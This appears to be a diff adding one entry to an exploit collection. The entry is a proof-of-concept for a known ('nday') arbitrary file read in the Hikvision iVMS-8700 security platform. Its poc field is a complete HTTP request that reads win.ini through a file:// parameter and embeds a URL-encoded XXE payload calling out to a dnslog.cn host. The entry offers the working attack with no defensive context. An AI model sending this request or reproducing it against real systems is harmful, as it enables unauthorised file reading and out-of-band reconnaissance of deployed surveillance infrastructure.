@@ -1,0 +1,7 @@
+vendor = "海康威视"
+name = "海康威视IVMS-8700综合安防系统鸡肋目录泄露"
+type = "任意文件读取"
+source = "TG"
+date = "08.15"
+poc = "GET //eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 HTTP/1.1 Host: x.x.x.x Content-Type: application/x-www-form-urlencoded Content-Length: 456 deviceIndexCode=1&xml=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%20%3F%3E%0A%20%20%20%20%20%20%20%20%3C%21DOCTYPE%20example%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ELEMENT%20example%20ANY%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ENTITY%20file%20SYSTEM%20%22http%3A%2F%2F2nlid7.dnslog.cn%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%3E%0A%3Cexample%3E%26file%3B%3C%2Fexample%3E"
+label = "nday"
